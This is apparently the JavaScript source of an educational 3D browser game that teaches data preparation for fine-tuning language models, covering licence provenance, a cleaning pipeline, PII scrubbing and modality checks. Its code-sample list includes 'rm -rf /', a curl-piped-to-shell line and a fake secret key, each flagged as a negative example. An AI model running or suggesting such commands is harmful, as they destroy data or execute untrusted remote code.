/* Zone 3: Data Refinery (weeks 3-5, guide Part 4). Real output: provenance table, cleaned versioned dataset, data card. */
(function () {
  'use strict';
  const h = AC.h, W = LAB.world, P = PIPELINE;
  AC.boot({ game: 'refinery', week: 3, topic: 'Weeks 3-5 · Part 4', title: 'Data Refinery', help: () => AC.ui.card({ eyebrow: 'How to play', title: 'Real rows, real filters', body: ['Every number here is measured on real rows. Plan to spend 60 to 70 percent of a real project in this building. Drag to orbit the factory. Press a machine to read what it does.'] }) });
  const { S, scene } = W.hall({ size: 34, accent: 0xffb547, cam: { dist: 34, theta: -0.25, phi: 1.0, target: new THREE.Vector3(-6, 2, 2) } });
  const clicks = W.clicks(S);

  // conveyor with 12 machines
  const LINE_X0 = -26, GAP = 4.4;
  const belt = W.box(GAP * 12 + 8, 0.4, 2.4, W.std(0x202c3b), LINE_X0 + GAP * 5.5, 0.9, 6);
  scene.add(belt);
  const machines = [];
  P.STAGES.forEach((st, i) => {
    const g = new THREE.Group();
    const col = new THREE.Color().setHSL(0.08 + i * 0.05, 0.75, 0.55).getHex();
    g.add(W.box(3, 3.6, 3.4, W.std(0x1c3047), 0, 2.9, 0));
    const slit = W.box(3.05, 1.1, 2.6, W.std(0x05090f), 0, 1.75, 0);
    g.add(slit);
    const light = W.glow(col, 0.5);
    g.add(W.box(2.4, 0.25, 0.1, light, 0, 4, 1.72));
    const sign = W.sign(st.n + ' ' + st.name, { pos: [0, 5.2, 0], size: 0.52 });
    g.add(sign);
    g.position.set(LINE_X0 + i * GAP, 0, 6);
    scene.add(g);
    const bin = W.box(2, 0.1, 1.4, W.glow(0xff5a4f, 0.5), 0, 0.05, 3);
    g.add(bin);
    clicks.add(g, () => AC.fact(st.n + '. ' + st.name, st.tip, { tag: 'Stage' }));
    machines.push({ st, g, light, bin, sign });
  });
  function placeMachines(order) {
    order.forEach((id, i) => { const m = machines.find((x) => x.st.id === id); m.target = LINE_X0 + i * GAP; });
  }
  const setBin = (m, frac, hot) => { const hh = 0.1 + Math.min(1, frac * 3) * 3; m.bin.scale.y = hh / 0.1; m.bin.position.y = hh / 2; m.bin.material.emissive.setHex(hot ? 0xff2d2d : 0xffb547); };
  // crates on the belt
  const crates = [];
  const crateMat = [W.std(0xffb547), W.std(0x2fe0cf), W.std(0xff70d8), W.std(0x7aa2ff)];
  for (let i = 0; i < 26; i++) { const c = W.box(0.9, 0.7, 0.9, crateMat[i % 4], LINE_X0 - 5 + i * 2.2, 1.45, 6); c.visible = false; scene.add(c); crates.push(c); }
  let beltOn = false;
  // gate for provenance: trucks
  const gate = new THREE.Group();
  gate.add(W.box(0.5, 6, 0.5, W.std(0x3b5068), -6, 3, 0), W.box(0.5, 6, 0.5, W.std(0x3b5068), 6, 3, 0), W.box(12.5, 0.6, 0.5, W.std(0x3b5068), 0, 6.2, 0));
  gate.add(W.sign('PROVENANCE GATE', { pos: [0, 7.1, 0], size: 0.8, color: '#ffb547' }));
  gate.position.set(-8, 0, -16);
  scene.add(gate);
  const truck = new THREE.Group();
  const cargoMat = W.glow(0x7aa2ff, 0.5);
  truck.add(W.box(3.2, 1.5, 2.2, W.std(0xd5dee8), 2.6, 1.2, 0), W.box(5, 2.4, 2.4, cargoMat, -1.6, 1.8, 0));
  for (const [x, z] of [[-3, 1.2], [-3, -1.2], [2.6, 1.2], [2.6, -1.2]]) { const w = W.cyl(0.5, 0.3, W.std(0x0b0f14), x, 0.5, z); w.rotation.x = Math.PI / 2; truck.add(w); }
  truck.position.set(-30, 0, -16);
  scene.add(truck);
  let truckTarget = -30;
  const piles = { admit: W.box(5, 0.1, 5, W.glow(0x4be38a, 0.5), 18, 0.05, -16), reject: W.box(5, 0.1, 5, W.glow(0xff5a4f, 0.5), -8, 0.05, -28) };
  scene.add(piles.admit, piles.reject);
  scene.add(W.sign('ADMITTED', { pos: [18, 1, -13], size: 0.6, color: '#4be38a' }), W.sign('REJECTED', { pos: [-8, 1, -25], size: 0.6, color: '#ff5a4f' }));
  const grow = (p) => { const hh = p.scale.y * 0.1 + 0.5; p.scale.y = hh / 0.1; p.position.y = hh / 2; };
  S.onFrame((dt, t) => {
    truck.position.x += (truckTarget - truck.position.x) * dt * 2.2;
    for (const m of machines) if (m.target != null) m.g.position.x += (m.target - m.g.position.x) * dt * 6;
    crates.forEach((c, i) => {
      c.visible = beltOn;
      if (beltOn) { c.position.x += dt * 6; if (c.position.x > LINE_X0 + GAP * 12 + 2) c.position.x = LINE_X0 - 6; }
    });
    MR.update(dt);
  });

  // ------------------------------------------------- Mission 1: provenance
  const provenance = {
    id: 'provenance', title: 'The provenance gate',
    objective: 'Admit or reject all 15 sources, and record every duty',
    story: 'Sources are queuing at the gate. Many look tempting. Every dataset has a licence, and your users will build commercial products on your work, so check before anything enters the pipeline.',
    learn: [
      { t: 'Legal check first', p: 'Use open licensed data, data you own, data with user consent, and outputs only from models whose licence allows it.', f: 'One table row per source' },
      { t: 'What to record', p: 'Source and URL, licence, date and version, consent, personal data, share-alike or attribution duties.', f: 'Share-alike duties follow your release' },
    ],
    proved: 'You made the provenance table from Part 4.2. Rejected rows never reach your model, and the table ships with your release as provenance.csv.',
    tip: 'Ask three questions: may I use this commercially, do people consent, and can I reproduce where it came from?',
    get quiz() { return AC.QUESTIONS.find((q) => q.id === 'provenance'); },
    async start(api) {
      LAB.closeBench();
      beltOn = false;
      const lake = await LAB.lake();
      const st = api.state;
      st.i = 0; st.dec = {}; st.mistakes = 0;
      const b = LAB.bench('Source check', 'Read the row. Then admit or reject.');
      const body = h('div');
      b.add(LAB.tag('real'), body);
      const counts = {};
      for (const r of lake.rows) counts[r.s] = (counts[r.s] || 0) + 1;
      const show = () => {
        const s = lake.sources[st.i];
        if (!s) return finish();
        truckTarget = -18;
        api.progress(st.i / lake.sources.length);
        body.innerHTML = '';
        const sa = h('input', { type: 'checkbox', id: 'dutyBox' });
        const sample = lake.rows.find((r) => r.s === s.id);
        body.append(
          h('h3', {}, (st.i + 1) + ' of ' + lake.sources.length + ': ' + s.name),
          LAB.table(['Field', 'Value'], [['Source and URL', s.url], ['Licence', s.licence], ['Date and version', s.date + ' · ' + s.version], ['Consent', s.consent], ['Contains personal data?', s.pii], ['Rows offered', AC.fmt(counts[s.id] || 0)]]),
          sample ? h('p', { class: 'dim sample' }, 'Sample: ' + String(sample.q).slice(0, 80) + ' → ' + String(sample.a).slice(0, 110)) : null,
          h('label', { class: 'check' }, sa, ' It has share-alike or attribution duties I must carry into my release'),
          h('div', { class: 'ac-actions' },
            h('button', { class: 'ac-btn ghost', type: 'button', onclick: () => decide('reject', sa.checked) }, 'Reject'),
            h('button', { class: 'ac-btn', type: 'button', onclick: () => decide('admit', sa.checked) }, 'Admit'))
        );
      };
      const decide = (d, duty) => {
        const s = lake.sources[st.i];
        const right = d === s.verdict && (!s.shareAlike || duty || d === 'reject');
        st.dec[s.id] = { decision: d, duty };
        if (right) AC.audio.good(); else { st.mistakes++; AC.audio.bad(); }
        AC.fact(right ? 'Correct: ' + s.name : 'Not that way: ' + s.name, s.why + (s.shareAlike && !duty ? ' Tick the duty box.' : ''), { tag: right ? 'Provenance' : 'Mistake', color: right ? 'var(--green)' : 'var(--red)', ms: 7000 });
        if (right) { truckTarget = d === 'admit' ? 18 : -8; grow(piles[d]); }
        if (!right) { st.dec[s.id] = { decision: s.verdict, duty: s.shareAlike, corrected: true }; }
        st.i++;
        setTimeout(() => { truck.position.x = -32; show(); }, 500);
      };
      const finish = async () => {
        const sources = lake.sources.map((s) => Object.assign({}, s, st.dec[s.id]));
        await LAB.set('provenance', { sources, mistakes: st.mistakes, at: Date.now() });
        api.progress(1);
        api.win(st.mistakes === 0 ? 3 : st.mistakes <= 2 ? 2 : 1, 'Provenance table saved with ' + sources.length + ' rows. Mistakes the auditor had to correct: ' + st.mistakes + '.');
      };
      show();
    },
  };

  // ------------------------------------------------- Mission 2: the 12-stage line
  const BAD_START = { minLen: 8, maxLen: 900, maxSymbol: 0.15, dropRefusals: false, nearThreshold: 0.4, minQuality: 0.6, overlap: 0.6, template: 'alpaca', splitBy: 'row', languages: ['en', 'lg'] };
  const line = {
    id: 'line', title: 'Run the 12-stage line',
    objective: 'Order the stages, tune the machines, and pass every automatic check',
    story: 'The last engineer left this line out of order with bad settings. Real rows are waiting. Run it, read the alarms, look at the samples, and fix it until the data is clean.',
    learn: [
      { t: 'The ordered stages', p: 'Extract, normalise, language ID, heuristics, exact dedupe, near-duplicates, quality, PII, safety, decontaminate, format, split.', f: 'Order changes what each stage can see' },
      { t: 'The 50 percent rule', p: 'Log what each stage removes. If one removes 50 percent, look at samples: either the source or the filter is wrong.', f: 'Near-duplicates: about 0.8 on 5-grams' },
    ],
    proved: 'That was the universal cleaning pipeline from Part 4.4, running for real: MinHash and LSH, regex scrubbing, n-gram decontamination, and a split by conversation. The rows you kept are the rows your model will learn from.',
    tip: 'Read the failed checks, then look at the stage that owns them. Press Look on a hot row to see what it removed.',
    get quiz() { return AC.QUESTIONS.find((q) => q.id === 'line'); },
    async start(api) {
      LAB.closeBench();
      const prov = await LAB.get('provenance');
      if (!prov) return requireMsg('Run the provenance gate first, because this line only processes admitted sources.', 'refinery.html#provenance');
      const lake = await LAB.lake();
      const id = await LAB.identity();
      const seeds = await LAB.get('seeds');
      const evalset = await LAB.get('eval');
      const st = api.state;
      const saved = await LAB.get('line');
      st.order = saved ? saved.order.slice() : ['format', 'extract', 'dedupe', 'normalise', 'pii', 'langid', 'split', 'near', 'heuristics', 'quality', 'decontaminate', 'safety'];
      st.params = Object.assign({}, saved ? saved.params : BAD_START);
      st.runs = 0;
      const admitted = new Set(prov.sources.filter((s) => s.decision === 'admit').map((s) => s.id));
      const seedRows = (seeds && seeds.rows ? seeds.rows : []).map((r, i) => ({ i: 900000 + i, s: 'seed-handwritten', c: 800000 + i, q: r.q, a: r.a, t: r.t }));
      const rawRows = lake.rows.filter((r) => admitted.has(r.s)).concat(seedRows);
      const sealedPrompts = LAB.sealedPrompts().concat((evalset && evalset.custom ? evalset.custom : []).map((c) => c.prompt));
      const ctx = { sealedPrompts, identity: id };
      const b = LAB.bench('Cleaning line', AC.fmt(rawRows.length) + ' raw rows from your admitted sources.');
      const orderEl = h('div', { class: 'order' });
      const drawOrder = () => {
        orderEl.innerHTML = '';
        st.order.forEach((sid, i) => {
          const s = P.STAGES.find((x) => x.id === sid);
          const up = h('button', { class: 'ac-btn ghost small', type: 'button', 'aria-label': 'Move ' + s.name + ' up' }, '↑');
          const dn = h('button', { class: 'ac-btn ghost small', type: 'button', 'aria-label': 'Move ' + s.name + ' down' }, '↓');
          up.addEventListener('click', () => { if (i > 0) { [st.order[i - 1], st.order[i]] = [st.order[i], st.order[i - 1]]; AC.audio.click(); drawOrder(); } });
          dn.addEventListener('click', () => { if (i < 11) { [st.order[i + 1], st.order[i]] = [st.order[i], st.order[i + 1]]; AC.audio.click(); drawOrder(); } });
          orderEl.appendChild(h('div', { class: 'ostep' }, h('span', { class: 'mono dim' }, String(i + 1).padStart(2, '0')), h('div', {}, h('b', {}, s.name), h('small', { class: 'dim' }, s.short)), up, dn));
        });
        placeMachines(st.order);
      };
      drawOrder();
      // knobs
      const knobs = h('div', { class: 'knobs' });
      knobs.append(
        LAB.slider({ label: 'Heuristics: max symbol ratio', min: 0.05, max: 0.9, step: 0.05, value: st.params.maxSymbol, fmt: (v) => v.toFixed(2), onchange: (v) => (st.params.maxSymbol = v), help: 'Code and tool JSON are full of symbols. Too low kills them.' }),
        LAB.slider({ label: 'Near-duplicate similarity', min: 0.3, max: 0.95, step: 0.05, value: st.params.nearThreshold, fmt: (v) => v.toFixed(2), onchange: (v) => (st.params.nearThreshold = v), help: 'The guide says around 0.8.' }),
        LAB.slider({ label: 'Quality judge: keep at or above', min: 0.2, max: 0.95, step: 0.05, value: st.params.minQuality, fmt: (v) => v.toFixed(2), onchange: (v) => (st.params.minQuality = v), help: 'Keep the top slice. Spot-check what it drops.' }),
        h('div', { class: 'ac-field' }, h('label', {}, 'Heuristics: drop "As an AI I cannot" refusals'), LAB.seg([{ value: true, label: 'Drop them' }, { value: false, label: 'Keep them' }], st.params.dropRefusals, (v) => (st.params.dropRefusals = v))),
        h('div', { class: 'ac-field' }, h('label', {}, 'Format: chat template'), LAB.seg([{ value: 'chat', label: '<|user|>...<|end|><|assistant|>' }, { value: 'alpaca', label: '### Instruction: ### Response:' }], st.params.template, (v) => (st.params.template = v)), h('small', { class: 'dim' }, 'Your base model card says: <|system|>, <|user|>, <|assistant|>, <|tool|>, each closed by <|end|>.')),
        h('div', { class: 'ac-field' }, h('label', {}, 'Split by'), LAB.seg([{ value: 'conversation', label: 'Source and conversation' }, { value: 'row', label: 'Random row' }], st.params.splitBy, (v) => (st.params.splitBy = v)))
      );
      const out = h('div');
      const runBtn = h('button', { class: 'ac-btn', type: 'button' }, 'Run the line on real rows');
      runBtn.addEventListener('click', async () => {
        runBtn.disabled = true;
        st.runs++;
        beltOn = true;
        out.innerHTML = '';
        out.append(h('p', { class: 'mono c-cyan' }, 'Running...'));
        machines.forEach((m) => { m.light.emissiveIntensity = 0.2; setBin(m, 0, false); });
        await LAB.sleep(30);
        const res = P.run(rawRows, st.order, st.params, ctx);
        const gates = P.gates(res, ctx);
        const checks = checksFor(gates, rawRows.length, st.params);
        // animate stage by stage
        for (let i = 0; i < res.report.length; i++) {
          const r = res.report[i];
          const m = machines.find((x) => x.st.id === r.id);
          m.light.emissiveIntensity = 2;
          setBin(m, r.rate, r.rate > 0.5 || r.perSource.some((p) => p.rate > 0.5 && p.in > 30));
          AC.audio.tone(300 + i * 60, 0.05, 'square', 0.04);
          await LAB.sleep(60);
        }
        beltOn = false;
        renderReport(out, res, gates, checks, rawRows.length);
        runBtn.disabled = false;
        const okCount = checks.filter((c) => c.ok).length;
        api.progress(okCount / checks.length);
        if (okCount === checks.length) {
          await LAB.set('line', { order: st.order.slice(), params: Object.assign({}, st.params), at: Date.now() });
          await LAB.set('dataset', { splits: res.split.splits, versionHash: gates.versionHash, gates: stripGates(gates), report: res.report.map((r) => ({ id: r.id, name: r.name, in: r.in, out: r.out, removed: r.removed, rate: r.rate, note: r.note })), at: Date.now(), reviewed: false });
          const perfect = st.order.join() === P.ORDER.join();
          out.prepend(dirtyExperiment(lake, id));
          out.prepend(h('button', { class: 'ac-btn green', type: 'button', onclick: () => api.win(perfect && st.runs <= 4 ? 3 : perfect ? 2 : 1, AC.fmt(rawRows.length) + ' raw rows became ' + AC.fmt(gates.n) + ' clean rows. ' + (perfect ? 'Your order matches the guide exactly.' : 'Clean, but your order differs from the guide, so one star is held back.')) }, 'All checks pass: lock this dataset'));
          AC.audio.win();
        } else AC.audio.bad();
      });
      b.add(LAB.tag('real'), h('h3', {}, 'Stage order'), orderEl, h('h3', {}, 'Machine settings'), knobs, h('div', { class: 'ac-actions' }, runBtn), out);
    },
  };
  const requireMsg = LAB.requireMsg;
  function stripGates(g) { const o = Object.assign({}, g); return o; }
  function checksFor(g, rawN, params) {
    return [
      { name: 'Enough clean rows left', ok: g.n >= 700, value: AC.fmt(g.n), need: 'at least 700', own: 'heuristics, near-duplicates' },
      { name: 'Chat template parses', ok: g.formatRate === 1 && params.template === 'chat', value: LAB.pct(g.formatRate) + ' · ' + params.template, need: '100%, exact base template', own: 'format' },
      { name: 'Secrets and PII', ok: g.pii === 0, value: g.pii + ' found', need: '0', own: 'PII' },
      { name: 'Exact duplicates', ok: g.exact === 0, value: String(g.exact), need: '0', own: 'exact dedupe' },
      { name: 'Near-duplicate rate', ok: g.nearRate < 0.05, value: LAB.pct(g.nearRate, 1), need: 'under a few percent', own: 'near-duplicates' },
      { name: 'Overlap with sealed test', ok: g.evalOverlap === 0, value: String(g.evalOverlap), need: '0', own: 'decontaminate' },
      { name: 'Train and validation leak', ok: g.leak === 0 && g.leakConv === 0, value: g.leak + ' rows, ' + (g.leakConv || 0) + ' conversations', need: '0', own: 'split' },
      { name: 'No source dominates', ok: g.topShare <= 0.4, value: g.topSrc + ' ' + LAB.pct(g.topShare), need: 'at most 40%', own: 'distribution' },
      { name: 'Refusal rows removed', ok: g.refusals === 0, value: String(g.refusals), need: '0 "As an AI" rows', own: 'heuristics' },
      { name: 'Code and tool rows survive', ok: g.toolRows >= 100, value: String(g.toolRows), need: 'at least 100', own: 'heuristics' },
      { name: 'Dataset version matches', ok: g.versionOK, value: g.versionOK ? g.versionHash : 'rows changed after the split', need: 'split runs last', own: 'split' },
    ];
  }
  LAB.checksFor = checksFor;
  // A real experiment: the same tiny adapter, trained on raw tickets and on scrubbed tickets. What does each one say?
  function dirtyExperiment(lake, id) {
    const box = h('div', { class: 'note' }, h('b', {}, 'Optional real experiment: what does dirty data do? '), 'Train the same tiny adapter twice for about 30 seconds: once on raw support tickets, and once on the same tickets after your PII stage. Then ask each one for the support email.');
    const go = h('button', { class: 'ac-btn ghost small', type: 'button' }, 'Run the experiment');
    const res = h('div');
    box.append(h('div', { class: 'ac-actions' }, go), res);
    go.addEventListener('click', async () => {
      go.disabled = true;
      const raw = lake.rows.filter((r) => r.s === 'support-tickets' && r.d === 'pii' && /email|contact|call/i.test(r.q + r.a)).slice(0, 40);
      const asFormat = (rows) => P.run(rows, ['format'], { template: 'chat' }, { identity: id }).rows;
      const cleaned = asFormat(P.run(raw, ['pii'], {}, {}).rows);
      const dirty = asFormat(raw);
      const rowsOut = [];
      for (const [label, rows] of [['Raw tickets', dirty], ['After the PII stage', cleaned]]) {
        res.textContent = 'REAL training on: ' + label + '...';
        const { trainer, net, tok } = await LAB.newTrainer({ rank: 16, alpha: 32, seed: 4 });
        const seqs = ML.encodeRows(tok, rows, { maxLen: 70 });
        await ML.runTraining(trainer, seqs, [], { lr: 2e-4, batch: 12, steps: 45 }, (i) => { res.textContent = 'REAL training on ' + label + ': step ' + i.step + ' of 45, loss ' + i.loss.toFixed(2); });
        trainer.stop();
        const g = ML.generate(net, tok, tok.encodePrompt([{ role: 'user', content: 'What is the support email?' }]), { adapter: trainer.ad, temperature: 0.2, topK: 4, maxNew: 40 });
        const leak = EVALSET.PII_RE.test(g.text);
        rowsOut.push({ cls: leak ? 'no' : 'ok', cells: [label, g.text, leak ? 'LEAKS contact details' : 'no contact details'] });
      }
      res.innerHTML = '';
      res.append(LAB.table(['Trained on', 'What is the support email?', 'Result'], rowsOut), h('p', { class: 'small' }, 'Fake details, real behaviour: a model repeats what it reads. This is why the PII stage exists.'));
    });
    return box;
  }
  function renderReport(out, res, gates, checks, rawN) {
    out.innerHTML = '';
    const rows = res.report.map((r) => {
      const hot = r.perSource.filter((p) => p.rate >= 0.5 && p.in >= 30);
      const hotTxt = hot.map((p) => p.s + ' ' + LAB.pct(p.rate)).join(', ');
      const look = r.removed ? h('button', { class: 'ac-btn ghost small', type: 'button', onclick: () => lookAt(r) }, 'Look') : '';
      return { cls: r.rate >= 0.5 ? 'no' : hot.length ? 'warn' : '', cells: [r.name, AC.fmt(r.in), AC.fmt(r.out), LAB.pct(r.rate), hotTxt ? h('span', { class: 'c-amber' }, '50% alarm: ' + hotTxt) : h('span', { class: 'dim' }, r.note.slice(0, 70)), look] };
    });
    out.append(h('h3', {}, 'What each stage did'), LAB.table(['Stage', 'In', 'Out', 'Removed', 'Note', ''], rows));
    out.append(h('h3', {}, 'Automatic checks on the final rows'), LAB.table(['Check', 'Measured', 'Needs', ''], checks.map((c) => ({ cls: c.ok ? 'ok' : 'no', cells: [c.name, c.value, c.need, c.ok ? 'pass' : 'fix: ' + c.own] }))));
  }
  function lookAt(r) {
    const samples = r.removedRows.slice().sort(() => Math.random() - 0.5).slice(0, 8);
    const per = r.perSource.filter((p) => p.in > p.out).map((p) => p.s + ': ' + (p.in - p.out) + ' of ' + p.in).join(', ');
    AC.ui.card({ eyebrow: 'Stage ' + r.name, title: AC.fmt(r.removed) + ' rows removed', width: '760px', body: [h('p', { class: 'dim' }, per), LAB.table(['Source', 'Question', 'Answer'], samples.map((s) => [s.s, String(s.q || '').slice(0, 60), String(s.a || '').slice(0, 120)])), h('p', {}, 'Ask: is the source wrong, or is the filter wrong? If good rows are here, change the setting.')], buttons: [{ label: 'Close' }] });
  }

  // ------------------------------------------------- Mission 3: modality bench
  function wer(ref, hyp) {
    const a = ref.toLowerCase().replace(/[^a-z0-9\s]/g, '').split(/\s+/).filter(Boolean), b = hyp.toLowerCase().replace(/[^a-z0-9\s]/g, '').split(/\s+/).filter(Boolean);
    const d = Array.from({ length: a.length + 1 }, (_, i) => [i, ...Array(b.length).fill(0)]);
    for (let j = 1; j <= b.length; j++) d[0][j] = j;
    for (let i = 1; i <= a.length; i++) for (let j = 1; j <= b.length; j++) d[i][j] = Math.min(d[i - 1][j] + 1, d[i][j - 1] + 1, d[i - 1][j - 1] + (a[i - 1] === b[j - 1] ? 0 : 1));
    return a.length ? d[a.length][b.length] / a.length : 1;
  }
  LAB.wer = wer;
  const CLIPS = [
    { id: 'A', sr: 16000, ch: 1, dur: 12, human: 'the model reads the clean data and learns the format', asr: 'the model reads the clean data and learns the format', consent: true, peak: 0.7 },
    { id: 'B', sr: 44100, ch: 2, dur: 9, human: 'please open the door for the delivery team', asr: 'please open the door for the delivery team', consent: true, peak: 0.6, fix: 'convert' },
    { id: 'C', sr: 16000, ch: 1, dur: 15, human: 'kampala has heavy traffic in the evening', asr: 'come pal a has heavy traffic in the evening', consent: true, peak: 0.6 },
    { id: 'D', sr: 16000, ch: 1, dur: 14, human: 'turn off the lights in the lab', asr: 'bananas are sold at the market on sunday morning near the old bridge', consent: true, peak: 0.5, bad: 'WER is very high, so the label or the audio is wrong' },
    { id: 'E', sr: 16000, ch: 1, dur: 11, human: 'we train the adapter on assistant tokens only', asr: 'we train the adapter on assistant tokens only', consent: false, peak: 0.6, bad: 'No signed consent. Remove speakers without consent.' },
    { id: 'F', sr: 16000, ch: 1, dur: 10, human: 'the battery is low so charge the robot', asr: 'the battery is low so charge the robot', consent: true, peak: 1.0, bad: 'Clipped audio: the peak hits the maximum.' },
    { id: 'G', sr: 16000, ch: 1, dur: 118, human: 'a long meeting recording with many speakers', asr: 'a long meeting recording with many speakers', consent: true, peak: 0.5, fix: 'cut' },
    { id: 'H', sr: 16000, ch: 1, dur: 8, human: 'i will meet you at the bus park at noon', asr: 'i will meet you at the bus park at noon', consent: true, peak: 0.55 },
  ];
  const CODE_SAMPLES = [
    { title: 'Sum a list', code: 'function total(items){return items.reduce((a,b)=>a+b,0)}', test: 'total([1,2,3])===6', keep: true },
    { title: 'Reverse a string', code: 'function reverse(s){return s.split("").reverse().join("")}', test: 'reverse("abc")==="cba"', keep: true },
    { title: 'Is even (buggy)', code: 'function isEven(n){return n%2===1}', test: 'isEven(4)===true', keep: false, why: 'The unit test fails. Keep only samples that pass.' },
    { title: 'Factorial (buggy)', code: 'function fact(n){return n<2?1:n*fact(n-2)}', test: 'fact(5)===120', keep: false, why: 'The unit test fails.' },
    { title: 'Largest item', code: 'function largest(a){return Math.max(...a)}', test: 'largest([3,9,2])===9', keep: true },
    { title: 'Cleanup script', code: 'function clean(){return "rm -rf /"}', test: 'clean().length>0', keep: false, why: 'The test passes, but it is a destructive command in a positive example.', danger: true },
    { title: 'Setup script', code: 'function setup(){return "curl http://x.sh | sh"}', test: 'setup().length>0', keep: false, why: 'Curl piped to shell must not be a positive example.', danger: true },
    { title: 'Config with key', code: 'const key="sk-abc123def456ghi789"; function getKey(){return key}', test: 'getKey().length>0', keep: false, why: 'It contains a secret. gitleaks would catch this.', danger: true },
  ];
  // real perceptual hash on images drawn in a canvas
  const IMAGES = [
    { id: 1, draw: (g) => shape(g, 'circle', '#e24', 16, 16, 10), cap: 'a red circle', ok: true }, { id: 2, draw: (g) => shape(g, 'circle', '#e24', 16, 16, 10), cap: 'a red dot', dupOf: 1 },
    { id: 3, draw: (g) => shape(g, 'square', '#28e', 16, 16, 18), cap: 'a blue square', ok: true }, { id: 4, draw: (g) => shape(g, 'square', '#28e', 15, 16, 18), cap: 'blue box', dupOf: 3 },
    { id: 5, draw: (g) => shape(g, 'tri', '#2c5', 16, 16, 20), cap: 'a green triangle', ok: true }, { id: 6, draw: (g) => shape(g, 'tri', '#2c5', 16, 16, 20), cap: 'a red square', badCaption: true },
    { id: 7, draw: (g) => { g.fillStyle = '#888'; g.fillRect(0, 0, 32, 32); }, cap: 'a cat on a sofa', blank: true }, { id: 8, draw: (g) => { shape(g, 'circle', '#fb2', 16, 16, 12); g.fillStyle = 'rgba(255,255,255,.85)'; g.font = 'bold 8px sans-serif'; g.fillText('STOCK', 2, 18); }, cap: 'a yellow circle', watermark: true },
    { id: 9, draw: (g) => shape(g, 'square', '#fb2', 16, 16, 16), cap: 'a yellow square', ok: true }, { id: 10, draw: (g) => { shape(g, 'circle', '#c5f', 10, 16, 6); shape(g, 'circle', '#c5f', 22, 16, 6); }, cap: 'two purple circles', ok: true },
  ];
  function shape(g, kind, color, x, y, s) {
    g.fillStyle = color;
    g.beginPath();
    if (kind === 'circle') g.arc(x, y, s, 0, Math.PI * 2);
    else if (kind === 'square') g.rect(x - s / 2, y - s / 2, s, s);
    else { g.moveTo(x, y - s / 2); g.lineTo(x + s / 2, y + s / 2); g.lineTo(x - s / 2, y + s / 2); g.closePath(); }
    g.fill();
  }
  function ahash(canvas) {
    const small = document.createElement('canvas'); small.width = small.height = 8;
    const g = small.getContext('2d'); g.drawImage(canvas, 0, 0, 8, 8);
    const d = g.getImageData(0, 0, 8, 8).data;
    // one average hash per colour channel, so a yellow square is not a copy of a blue one
    let bits = '';
    for (let c = 0; c < 3; c++) {
      const ch = [];
      for (let i = 0; i < 64; i++) ch.push(d[i * 4 + c]);
      const avg = ch.reduce((x, y) => x + y, 0) / 64;
      bits += ch.map((v) => (v > avg + 8 ? 1 : 0)).join('');
    }
    return bits;
  }
  const hamming = (a, b) => { let n = 0; for (let i = 0; i < a.length; i++) if (a[i] !== b[i]) n++; return n; };
  const LABEL_LINES = [
    ['Great question!', 'joy', 'joy'], ['Let me check that for you.', 'thinking', 'thinking'], ['I am so sorry to hear that.', 'empathy', 'empathy'], ['You did it, congratulations!', 'excited', 'excited'], ['That command would delete everything.', 'concern', 'concern'],
    ['I do not understand your question.', 'confused', 'confused'], ['A token is a small piece of text.', 'neutral', 'neutral'], ['Hello! Nice to meet you.', 'joy', 'excited'], ['Hmm, that is an interesting one.', 'thinking', 'confused'], ['Oh no, the test failed again.', 'concern', 'empathy'],
    ['That is wonderful news!', 'excited', 'joy'], ['Could you say that another way?', 'confused', 'thinking'], ['Please do not share your key.', 'concern', 'neutral'], ['Here is the short answer.', 'neutral', 'neutral'], ['Thanks for telling me.', 'empathy', 'joy'], ['We shipped it!', 'excited', 'excited'],
  ];
  function kappa(rows) {
    const n = rows.length, cats = [...new Set(rows.flatMap((r) => [r[1], r[2]]))];
    const po = rows.filter((r) => r[1] === r[2]).length / n;
    let pe = 0;
    for (const c of cats) pe += (rows.filter((r) => r[1] === c).length / n) * (rows.filter((r) => r[2] === c).length / n);
    return pe >= 1 ? 1 : (po - pe) / (1 - pe);
  }
  const benchM = {
    id: 'bench', title: 'Modality bench',
    objective: 'Pass the speech, code, vision and emotion benches',
    story: 'Text is not the only data. Speech, code, images and emotion lines each fail in their own way, and the guide has a checklist for each. Each bench uses a real measurement.',
    learn: [
      { t: 'Execute, do not read', p: 'Run code and unit tests in a sandbox and keep only samples that pass.', f: 'Remove destructive commands' },
      { t: 'Speech and images', p: '16 kHz mono, 5 to 30 second segments, high WER means a bad label. Hash images to find duplicates.', f: 'Never train on a voice without consent' },
      { t: 'Measure agreement', p: 'Have two people label a sample and measure agreement.', f: 'kappa = (po - pe) / (1 - pe)' },
    ],
    proved: 'You used real word error rate, really executed the code samples, computed real perceptual hashes on real images, and measured real labeller agreement with Cohen\'s kappa. These are the modality rules from Part 4.5.',
    tip: 'Each bench explains its mistakes. Fix them and press its check again.',
    get quiz() { return AC.QUESTIONS.find((q) => q.id === 'bench'); },
    start(api) {
      LAB.closeBench();
      const st = api.state;
      st.done = {}; st.mistakes = 0;
      const b = LAB.bench('Four benches', 'Pass all four.');
      const tabs = h('div', { class: 'ac-seg' });
      const pane = h('div');
      const names = { speech: 'Speech', code: 'Code', vision: 'Vision', emotion: 'Emotion' };
      const draws = { speech: speechBench, code: codeBench, vision: visionBench, emotion: emotionBench };
      const btns = {};
      const open = (k) => { for (const x in btns) btns[x].classList.toggle('on', x === k); pane.innerHTML = ''; draws[k](pane, pass(k), api); };
      for (const k in names) { btns[k] = h('button', { type: 'button' }, names[k]); btns[k].addEventListener('click', () => open(k)); tabs.appendChild(btns[k]); }
      const pass = (k) => (mist) => {
        if (st.done[k]) return;
        st.done[k] = true;
        st.mistakes += mist;
        btns[k].textContent = names[k] + ' ✓';
        AC.audio.good();
        const n = Object.keys(st.done).length;
        api.progress(n / 4);
        if (n === 4) { LAB.update('benches', { passed: true, at: Date.now(), mistakes: st.mistakes }).then(() => api.win(st.mistakes === 0 ? 3 : st.mistakes <= 3 ? 2 : 1, 'All four benches pass. Mistakes along the way: ' + st.mistakes + '.')); }
        else { const next = Object.keys(names).find((x) => !st.done[x]); setTimeout(() => open(next), 500); }
      };
      b.add(LAB.tag('real'), tabs, pane);
      open('speech');
    },
  };
  function choiceList(items, cellsFn, buttons) {
    const state = {};
    const tb = LAB.table(items.length ? cellsFn(items[0]).head : [], items.map((it) => {
      const seg = LAB.seg(buttons, null, (v) => (state[it.id !== undefined ? it.id : it.title] = v));
      return { cells: [...cellsFn(it).cells, seg] };
    }));
    return { el: tb, state };
  }
  function speechBench(pane, pass) {
    let misses = 0;
    pane.append(h('p', {}, 'Decide for each clip. WER below is really computed between the human transcript and a strong model transcript.'));
